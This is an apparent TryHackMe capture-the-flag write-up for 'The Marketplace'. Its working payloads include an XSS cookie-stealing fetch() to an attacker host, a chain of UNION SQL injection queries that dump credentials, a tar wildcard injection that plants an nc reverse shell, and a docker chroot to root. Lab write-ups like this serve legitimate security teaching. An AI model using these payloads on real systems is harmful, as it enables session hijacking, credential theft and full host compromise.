#### Enumeration
First of, lets try to nmap and see how many ports opened.

![[Pasted image 20211124094749.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124094749.png)

We can see that port 22, 80 and 32768 are opened.

Let's try to visit the website; both http ports of 80 and 32768 have the same web appearance. 

At the same time I run dirsearch as to enumerate as many directories that we might miss out.

![[Pasted image 20211124095411.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124095411.png)

#### XSS Scripting
There is a new listing we can do, at first I thought we can insert malicious php file but I was wrong. I got stuck and after several lookups I got it that this is an XSS vulnerability. First let's put this code as the payload for our XSS in the title value

`<script>fetch("http://10.4.44.74:8000/"+document.cookie)</script>asdf`

Then let's open our our port to 8000. This basically can be achieve with `python3 -m http.server 8000` (default port: 8000) or `python SimpleHTTPServer`. Then after submission, we get a token value.

![[Pasted image 20211124095446.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124095446.png)

The first token is our submission to the web, the second is achieved by reporting our listing as it mentioned that "One of the admin will take a look at the report"

We want one of the admin to click on it and obtain their token and we got it. We can copy the code from our terminal and paste it to our developer console. Since I'm using Chrome, it is situated at Application > Cookies

Right after changed ourself into one of the admin, we can get the flag in Administration Panel

'THM{c37a63895910e478f28669b048c348d5}'

![[Pasted image 20211124095648.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124095648.png)

#### SQL injection

![[Pasted image 20211124094529.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124094529.png)

This is what happen when we insert until value 5

![[Pasted image 20211124094043.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124094043.png)

by inserting  `union select 1,2,3,4`  we can get a reflective value. In this case, its 1 and 2  are reflected.

![[Pasted image 20211124100545.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124100545.png)
![[Pasted image 20211124100533.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124100533.png)

Let's get the database name; by replacing value 2 with `database()` ; we can obtain the database name
`union select 1,database(),3,4`

![[Pasted image 20211124100740.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124100740.png)

Since we know that the database name is 'marketplace'. Let's try to get the tables under it.

`union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'`

![[Pasted image 20211124101140.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124101140.png)

We get table name items, messages and users. Let's try to get the column name available for 'users'

`union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'`

![[Pasted image 20211124101407.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124101407.png)

Attempt to get the password of the users
`union select 1,group_concat(password),3,4 from users`

![[Pasted image 20211124101909.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124101909.png)

 I don't think there's any important information but lets just save the hash in case. Now let's get into the message and see what it got.

`union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'`

![[Pasted image 20211124102304.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124102304.png)

Let's read user_from , message_content and , user_to

`union select 1,group_concat(user_from,+message_content,+user_to),3,4 from messages`

Since it's kinda hard for us to see, so I put some changes to make it looks more easier to read. 

`union select 1,group_concat(user_from,+":-- ",+message_content,+" -->",+user_to),3,4 from messages` or you can customize however you like

![[Pasted image 20211124103524.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124103524.png)

"User SENDER 1:-- Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: **@b_ENXkGYUCAv3zJ** -->** RECEIPIENT 3**, SENDER 1:-- Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! --> RECEIPIENT 4, SENDER 1:-- Thank you for your report. We have reviewed the listing and found nothing that violates our rules. --> RECEIPIENT 4, SENDER 1:-- Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! --> RECEIPIENT 4, SENDER 1:-- Thank you for your report. We have reviewed the listing and found nothing that violates our rules. --> RECEIPIENT 4"

We get the password but we dont know who is user 3, lets change the user=0 to user=3.

![[Pasted image 20211124103819.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124103819.png)

Now we know that user 3's SSH username and password is jake and @b_ENXkGYUCAv3zJ respectively, lets try to SSH it


Boom! We're in as Jake. There is flag and just cat into it

'THM{c3648ee7af1369676e3e4b15da6dc0b4'

![[Pasted image 20211124103921.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124103921.png)

Let's see what user Jake can do with the sudo command `sudo -l`
![[Pasted image 20211124104156.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124104156.png)

It seems that user Jake can run as michael without any password on /opt/backups/backup.sh

The file is indeed owned by michael and we can run it with jake by reading it
It seems that the bash file is backing up everything in the /opt/backups directory.

Since there is a wildcard * present with tar commands, we can exploit it and summon a reverse shell.

cd to the backup.sh directory; /opt/backups/

```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.44.74 1234 >/tmp/f" > shell.sh

sudo -u michael ./backup.sh
```

If there is an error; try to rename the existed backup.tar or move it to somewhere else
`mv backup.tar lol.tar`

![[Pasted image 20211124111235.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124111235.png)

Since michael is within Docker Group. We can run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

By going to GTFOBin we can search for docker;

![[Pasted image 20211124112150.png]](https://github.com/0xK4gura/notes/blob/main/TryHackMe/Writeup/The%20Marketplace/attachments/Pasted%20image%2020211124112150.png)

This command make us mount as the root user for the root filesystem to /mnt. The root is in /root/root.txt